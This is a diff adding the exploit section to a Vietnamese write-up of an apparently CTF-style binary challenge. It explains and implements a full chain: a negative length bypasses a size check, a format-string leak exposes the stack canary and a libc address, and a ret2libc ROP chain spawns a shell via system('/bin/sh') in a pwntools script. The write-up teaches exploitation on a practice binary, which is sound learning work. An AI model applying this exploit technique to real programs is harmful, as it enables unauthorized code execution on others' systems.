@@ -264,3 +264,60 @@ pop_rdi_runtime_addr = libc_base_addr + pop_rdi_offset
 system_offset = e_libc.symbols['system']
 system_runtime_addr = libc_base_addr + system_offset
 ```
+
+#### Exploit
+Kết hợp mọi thứ lại, ta exploit như sau:
+- Truyền vào `len` một con số âm để bypass được đoạn `len < 0x50` nhưng vẫn cho phép ta ghi được `message` lớn.
+- Khai thác lỗ hổng format string của `printf(message)` để leak giá trị của canary và địa chỉ runtime của `__libc_start_main+234`.
+- Với địa chỉ runtime của `__libc_start_main+234`, ta tính được địa chỉ nền runtime của `libc`.
+- Với địa chỉ nền runtime của `libc`, ta tính được địa chỉ runtime của rop gadget, `system`, và `/bin/sh`.  
+
+Code exploit:
+```python
+from pwn import *
+
+
+p = process('./basic')
+e = ELF('./basic')
+
+p.recvuntil(b'Nhap do dai tin nhan: ')
+
+len_exploit = 0x80000001
+p.sendline(str(len_exploit).encode())
+
+payload = b'%19$lx.%23$lx' # canary.return_addr_to_main (__libc_start_main)
+p.sendline(payload)
+
+printf_result = p.recvline().strip()
+
+canary, main_return_addr = list(map(lambda x: int(x, 16), (printf_result.decode().split('.'))))
+
+p.sendline(b'1')
+
+e_libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
+libc_start_main_offset = e_libc.symbols['__libc_start_main']
+libc_base_addr = main_return_addr - 234 - libc_start_main_offset 
+
+bin_sh_addr_offset = list(e_libc.search(b'/bin/sh'))[0]
+bin_sh_runtime_addr = libc_base_addr + bin_sh_addr_offset
+
+rop = ROP(e_libc)
+pop_rdi_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rdi_runtime_addr = libc_base_addr + pop_rdi_offset
+
+system_offset = e_libc.symbols['system']
+system_runtime_addr = libc_base_addr + system_offset
+
+
+payload = b'A' * (0x60 - 0x8) + p64(canary) # store canary
+payload += b'A' * 0x8 # overwrite main's stored rbp
+payload += p64(pop_rdi_runtime_addr) # overwrite return address of vuln
+payload += p64(bin_sh_runtime_addr) # pop /bin/sh from this to rdi
+payload += p64(system_runtime_addr) # ret & jump to system
+
+with open('payload.in', 'wb') as f:
+    f.write(payload)
+
+p.sendline(payload)
+p.interactive()
+```
